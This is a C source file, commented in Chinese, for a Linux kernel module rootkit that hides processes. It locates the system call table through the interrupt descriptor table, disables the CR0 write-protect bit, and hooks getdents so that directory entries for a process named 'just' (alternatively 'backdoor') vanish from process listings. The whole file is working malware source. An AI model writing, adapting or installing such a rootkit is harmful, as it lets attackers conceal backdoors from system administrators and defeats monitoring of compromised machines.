/*
  进程隐藏程序
*/
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/types.h>
#include <linux/sched.h>
#include <linux/dirent.h>//目录文件结构
#include <linux/string.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/list.h>
#include <asm/uaccess.h>
#include <linux/unistd.h>
#define CALLOFF 100
int orig_cr0;
char psname[10]="just";//需要隐藏的进程名
//char psname[10]="backdoor";
char *processname=psname;

//module_param(processname, charp, 0);
struct {
    unsigned short limit;
    unsigned int base;
} __attribute__ ((packed)) idtr;//__attribute__ ((packed))不需要内存对齐的优化

struct {
    unsigned short off1;
    unsigned short sel;
    unsigned char none,flags;
    unsigned short off2;
} __attribute__ ((packed)) * idt;

struct linux_dirent{//文件结构体
    unsigned long     d_ino;//索引节点号
    unsigned long     d_off;//在目录文件中的偏移
    unsigned short    d_reclen;//文件名长
    char    d_name[1];//文件名
};

void** sys_call_table;

unsigned int clear_and_return_cr0(void)//设置CR0，取消写保护位，因为在较新的内核中，sys_call_table的内存是只读的，
//所以要修改系统调用表就必须设置CR0
{
    unsigned int cr0 = 0;
    unsigned int ret;

    asm volatile ("movl %%cr0, %%eax"
            : "=a"(cr0)
         );
    ret = cr0;

    /*clear the 16th bit of CR0,*/
    cr0 &= 0xfffeffff;//设置CR0，第16位，WP（Write Protect）,它控制是否允许处理器向标志为只读属性的内存页写入数据,
    //0时表示禁用写保护功能
    asm volatile ("movl %%eax, %%cr0"
            :
            : "a"(cr0)//输入，cr0到eax，eax到cr0
         );
    return ret;
}

void setback_cr0(unsigned int val)
{
    asm volatile ("movl %%eax, %%cr0"
            :
            : "a"(val)//val值给eax，eax的值给CR0,恢复写保护位
         );
}


asmlinkage long (*orig_getdents)(unsigned int fd,
                    struct linux_dirent __user *dirp, unsigned int count);

char * findoffset(char *start)//遍历sys_call代码，查找sys_call_table的地址
{  //也可以通过cat /boot/System.map-`uname -r` |grep sys_call_table  查看当前sys_call_table地址
    char *p;
    for (p = start; p < start + CALLOFF; p++)
    if (*(p + 0) == '\xff' && *(p + 1) == '\x14' && *(p + 2) == '\x85')//寻找call指令
        return p;
    return NULL;
}

int myatoi(char *str)//字符串转整型
{
    int res = 0;
    int mul = 1;
    char *ptr;
    for (ptr = str + strlen(str) - 1; ptr >= str; ptr--)
    {
        if (*ptr < '0' || *ptr > '9')
            return (-1);
        res += (*ptr - '0') * mul;
        mul *= 10;
    }
    if(res>0 && res< 9999)
        printk(KERN_INFO "pid=%d,",res);
    printk("\n");
    return (res);
}

struct task_struct *get_task(pid_t pid)//遍历进程双向循环链表，根据PID，查找需要隐藏的进程，并返回该进程控制块
{
    struct task_struct *p = get_current(),*entry=NULL;
    list_for_each_entry(entry,&(p->tasks),tasks)
    {
        if(entry->pid == pid)
        {
            printk("pid found=%d\n",entry->pid);
            return entry;
        }
        else
        {
    //    printk(KERN_INFO "pid=%d not found\n",pid);
        }
    }
    return NULL;
}

static inline char *get_name(struct task_struct *p, char *buf)//获取进程名
{
    int i;
    char *name;
    name = p->comm;
    i = sizeof(p->comm);
    do {
        unsigned char c = *name;
        name++;
        i--;
        *buf = c;
        if (!c)
            break;
        if (c == '\\') {
            buf[1] = c;
            buf += 2;
            continue;
        }
        if (c == '\n')
        {
            buf[0] = '\\';
            buf[1] = 'n';
            buf += 2;
            continue;
        }
        buf++;
    }
    while (i);
    *buf = '\n';
    return buf + 1;
}

int get_process(pid_t pid)//判断是否找到隐藏进程
{
    struct task_struct *task = get_task(pid);
    //    char *buffer[64] = {0};
    char buffer[64];
    if (task)
    {
        get_name(task, buffer);
    //    if(pid>0 && pid<9999)
    //    printk(KERN_INFO "task name=%s\n",*buffer);
        if(strstr(buffer,processname))
            return 1;
        else
            return 0;
    }
    else
        return 0;
}

asmlinkage long hacked_getdents(unsigned int fd,
                    struct linux_dirent __user *dirp, unsigned int count)//修改的系统调用，替换原来的sys_getdents
{
    //added by lsc for process
    long value;
    //    struct inode *dinode;
    unsigned short len = 0;
    unsigned short tlen = 0;
//    struct linux_dirent *mydir = NULL;
//end
    value = (*orig_getdents) (fd, dirp, count);//调用sys_getdents,返回该目录文件下目录的总字节数
    tlen = value;
    while(tlen > 0)
    {
        len = dirp->d_reclen;//当前遍历的目录的长度
        tlen = tlen - len;
        printk("%s\n",dirp->d_name);

        if(get_process(myatoi(dirp->d_name)) )
        {
            printk("find process\n");
            memmove(dirp, (char *) dirp + dirp->d_reclen, tlen);//覆盖掉需要隐藏的进程
            value = value - len;
            printk(KERN_INFO "hide successful.\n");
        }
        if(tlen)
            dirp = (struct linux_dirent *) ((char *)dirp + dirp->d_reclen);//移到后面一个目录，继续查找是否有其他同名的需要隐藏的进程
    }
    printk(KERN_INFO "finished hacked_getdents.\n");
    return value;
}


void **get_sct_addr(void)
{
    unsigned sys_call_off;
    unsigned sct = 0;
    char *p;
    asm("sidt %0":"=m"(idtr));//获取中断描述符表地址
    idt = (void *) (idtr.base + 8 * 0x80);//通过0x80中断找到system_call的服务例程描述符项，一个中断描述符8个字节
    sys_call_off = (idt->off2 << 16) | idt->off1;//找到对应的system_call代码地址
    if ((p = findoffset((char *) sys_call_off)))//找到sys_call_table的地址
        sct = *(unsigned *) (p + 3);
    return ((void **)sct);
}


static int filter_init(void)
{
    sys_call_table = get_sct_addr();
    if (!sys_call_table)
    {
        printk("get_act_addr(): NULL...\n");
        return 0;
    }
    else
        printk("sct: 0x%x\n", (unsigned int)sys_call_table);
    orig_getdents = sys_call_table[__NR_getdents];//保存原来的系统调用

    orig_cr0 = clear_and_return_cr0();//取消写保护位，并且返回原来的cr0
    sys_call_table[__NR_getdents] = hacked_getdents;//替换成我们自己写的系统调用
    setback_cr0(orig_cr0);
    printk(KERN_INFO "hideps: module loaded.\n");
                return 0;
}


static void filter_exit(void)
{
    orig_cr0 = clear_and_return_cr0();
    if (sys_call_table)
    sys_call_table[__NR_getdents] = orig_getdents;//恢复默认的系统调用
    setback_cr0(orig_cr0);
    printk(KERN_INFO "hideps: module removed\n");
}
module_init(filter_init);
module_exit(filter_exit);
MODULE_LICENSE("GPL");
